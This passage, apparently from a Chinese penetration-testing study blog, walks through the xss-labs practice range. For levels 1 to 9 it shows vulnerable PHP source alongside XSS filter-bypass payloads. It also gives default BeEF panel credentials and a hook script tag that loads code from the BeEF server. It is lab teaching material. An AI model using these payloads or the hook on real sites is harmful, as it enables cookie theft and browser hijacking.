class="line-numbers-rows"><span></span></span></code></pre><h2 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h2><p><a href="http://192.168.31.76:3000/ui/panel">http://192.168.31.76:3000/ui/panel</a> </p><p><strong>用户名 :beef</strong> </p><p><strong>密码 :bebeef</strong></p><p>配置文件：/etc/beef-xss/config.yaml </p><h2 id="钩子地址"><a href="#钩子地址" class="headerlink" title="钩子地址"></a>钩子地址</h2><p><a href="http://192.168.31.76:3000/hook.js">http://192.168.31.76:3000/hook.js</a> </p><p>payload </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.31.76:3000/hook.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="Detials"><a href="#Detials" class="headerlink" title="Detials"></a>Detials</h3><p>浏览器、插件版本信息，操作系统信息 </p><h3 id="Logs"><a href="#Logs" class="headerlink" title="Logs"></a>Logs</h3><p>浏览器动作：焦点变化，鼠标单击，信息输入 </p><h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3><ul><li>绿色模块：表示模块适用当前用户，并且执行结果对用户不可见 </li><li>红色模块：表示模块不适用当前用户，有些红色模块也可以执行 </li><li>橙色模块：模块可用，但结果对用户可见 </li><li>灰色模块：模块为在目标浏览器上测试过</li></ul><h3 id="XSS-Rays"><a href="#XSS-Rays" class="headerlink" title="XSS Rays"></a>XSS Rays</h3><p>XSS扫描工具 </p><p><a href="https://github.com/beefproject/beef/wiki/xss-ray">https://github.com/beefproject/beef/wiki/xss-ray</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-labs/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建xss-labs"><a href="#搭建xss-labs" class="headerlink" title="搭建xss-labs"></a>搭建xss-labs</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332">https://blog.csdn.net/wo41ge/article/details/107459332</a></p><h1 id="访问靶场"><a href="#访问靶场" class="headerlink" title="访问靶场"></a>访问靶场</h1><p><a href="http://192.168.31.193:8080/">http://192.168.31.193:8080</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="http://192.168.31.193:8080/level1.php?name=test">http://192.168.31.193:8080/level1.php?name=test</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>欢迎来到level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;欢迎用户"</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h2&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level1.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payload的长度:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="没有任何过滤，get型"><a href="#没有任何过滤，get型" class="headerlink" title="没有任何过滤，get型"></a>没有任何过滤，get型</h3><p><code>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="http://192.168.31.193:8080/level2.php?keyword=test">http://192.168.31.193:8080/level2.php?keyword=test</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value="搜索"/&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一处参数输出被<strong>htmlspecialchars函数</strong>处理<br>第二处没有做过滤。</p><h3 id="测试有做了什么过滤"><a href="#测试有做了什么过滤" class="headerlink" title="测试有做了什么过滤"></a>测试有做了什么过滤</h3><p><code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\"&lt;&gt;</code></p><p>查看网页源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>没有找到和<span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span> 相关的结果.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\<span class="token entity named-entity" title="'">&amp;apos;</span>\<span class="token punctuation">"</span></span><span class="token attr-name">&lt;</span><span class="token punctuation">&gt;</span></span> "&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用-”-gt-闭合"><a href="#使用-”-gt-闭合" class="headerlink" title="使用**”>**闭合"></a>使用**”&gt;**闭合</h3><p><code>?keyword="&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;"</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="http://192.168.31.193:8080/level3.php?writing=wait">http://192.168.31.193:8080/level3.php?writing=wait</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value='"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试有做了什么过滤-1"><a href="#测试有做了什么过滤-1" class="headerlink" title="测试有做了什么过滤"></a>测试有做了什么过滤</h3><p><code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\"&lt;&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>没有找到和<span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span>相关的结果.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level3.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>GET</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两个输出参数的地方都有被过滤,单引号没有过滤。</p><table><thead><tr><th>&lt;</th><th><code>&amp;lt;</code></th></tr></thead><tbody><tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr><tr><td>“</td><td><code>\&amp;quot;</code></td></tr></tbody></table><p>闭合value=’的单引号</p><blockquote><p>onmouseover事件会在<strong>鼠标指针移动</strong>到指定的对象上时触发事件发生。</p></blockquote><p><code>?writing=' onmouseover='alert(/xss/)'</code></p><p>移动鼠标到输入框触发xss.</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="http://192.168.31.193:8080/level4.php?keyword=try%20harder">http://192.168.31.193:8080/level4.php?keyword=try%20harder</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将前后<strong>括号</strong>替换为空，**双引号”**闭合</p><p><code>" onmouseover="alert(/xss/)</code></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="http://192.168.31.193:8080/level5.php?keyword=find%20a%20way%20out">http://192.168.31.193:8080/level5.php?keyword=find%20a%20way%20out</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对**&lt;script和on<strong>做了加下划线处理，</strong>双引号”**闭合</p><p><strong>strtolower()函数</strong>，他会把提交的所有字符转换为<strong>小写</strong></p><p>测试做了什么处理</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>变成了 </p><p><code>&lt;scr_ipt " 'oo_nn&gt;</code></p><p>在中间加了下划线,大O变成小写了。</p><p>关键字处理一次，单引号和双引号依然存在。</p><p><code>"&gt;&lt;a href ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="http://192.168.31.193:8080/level6.php?keyword=break%20it%20out">http://192.168.31.193:8080/level6.php?keyword=break%20it%20out</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str6</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对**&lt;script，on，src，data，href**做了加下划线处理。</p><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>&lt;scr_ipt “ ‘Oo_nn&gt;</p><p>和之前过滤一下。尝试之前的payload</p><p><code>"&gt;&lt;a href ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><p>发现超链接被过滤</p><p><a hr_ef="javascript:alert:alert(/xss/)">click</a></p><p>尝试<strong>大小写</strong> ，<strong>hrEf</strong></p><p><code>"&gt;&lt;a hrEf ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p><a href="http://192.168.31.193:8080/level7.php?keyword=move%20up">http://192.168.31.193:8080/level7.php?keyword=move%20up</a>!</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php ini_set("display_errors", 0);$str =strtolower( $_GET["keyword"]);$str2=str_replace("script","",$str);$str3=str_replace("on","",$str2);$str4=str_replace("src","",$str3);$str5=str_replace("data","",$str4);$str6=str_replace("href","",$str5);echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value="'.$str6.'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>strtolower将传参变为小写，</p><p>script，on，src，data，href被替换为空，</p><p>尝试<strong>双写</strong> s<em>script</em>cript</p><p><code>"&gt;&lt;sscriptcript&gt; alert(/xss/)&lt;/sscriptcript&gt;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><a href="http://192.168.31.193:8080/level8.php?keyword=nice%20try">http://192.168.31.193:8080/level8.php?keyword=nice%20try</a>!</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);$str2=str_replace("script","scr_ipt",$str);$str3=str_replace("on","o_n",$str2);$str4=str_replace("src","sr_c",$str3);$str5=str_replace("data","da_ta",$str4);$str6=str_replace("href","hr_ef",$str5);$str7=str_replace('"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p><a href="<scr_ipt &quot; 'oo_nn>">友情链接</a></p><a href="<scr_ipt &quot; 'oo_nn>"><p>单引号没有被处理，尝试使用伪协议</p><p><code>javascript:alert(/xss/)</code></p></a><a href="javascr_ipt:alert(/xss/)"><p>也被处理了，尝试使用<strong>16进制编码</strong></p><p><strong>s</strong>的16进制是 &amp;<strong>#x73;</strong></p><p><code>java&amp;#x73;cript:alert(/xss/)</code></p><p>总结</p><p>hackbar无法提交unicode，<code>&amp;</code>被当成参数了，可以尝试将<code>&amp;</code>进行url编码，或直接在网页的输入payload了</p><p>unicode可以和ascii码混合使用；s的unicode加ascii编码是<code>&amp;#115;</code>，再进行16进制转换是<code>&amp;#x73;</code></p><p>unicode有两种，<code>&amp;#</code>的是web网页上使用的，<code>\u</code>是java上使用的。</p></a><h2 id="level9"><a href="javascr_ipt:alert(/xss/)"></a><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>http://192.168.31.193:8080/level9.php?keyword=not%20bad!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><a href="您的链接不合法？有没有！"><p>没有显示怎么处理的.</p><p>尝试上有关的payload</p><p><code>java&amp;#x73;cript:alert(/xss/)</code></p></a><a href="您的链接不合法？有没有！"><p>依旧提示<strong>链接不合法</strong>，换成百度**’http://www.baidu.com'**试试。</p><p><code>java&amp;#x73;cript:alert('http://www.baidu.com')</code></p></a><h2 id="level10"><a href="您的链接不合法？有没有！"></a><a href="#level10" class="headerlink" 